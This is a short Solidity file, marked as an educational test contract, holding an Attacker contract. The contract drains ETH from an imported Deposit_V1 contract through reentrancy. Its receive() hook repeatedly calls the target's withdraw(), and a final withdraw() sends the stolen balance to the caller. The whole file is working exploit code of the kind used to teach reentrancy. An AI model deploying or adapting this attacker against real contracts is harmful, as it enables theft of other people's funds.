// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

/**
    TEST CONTRACT: SECUIRTY NOT CONSIDERED; EDUCATIONAL PURPOSE; DONOT USE
*/

import "./Deposit_V1.sol";

contract Attacker {
    Deposit_V1 public vulnerableContract;

    // This function receives ETH and triggers the attack
    receive() external payable {
        // Check if the vulnerable contract has enough ETH to withdraw
        if (address(vulnerableContract).balance >= 1 ether) {
            // Withdraw 1 ETH fom the contract
            vulnerableContract.withdraw(1 ether);
        }
    }

    // This function initiates the attack by depositing ETH and then withdrawing it
    function attack(address _address) external payable {
        vulnerableContract = Deposit_V1(_address);
        require(msg.value >= 1 ether, "low fund for attack");
        vulnerableContract.deposit{value: 1 ether}(); // Deposit 1 ETH into the vulnerable contract
        vulnerableContract.withdraw(1 ether); // Immediately try to withdraw 1 ETH
    }

    // withdraw locked ETH
    function withdraw() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}
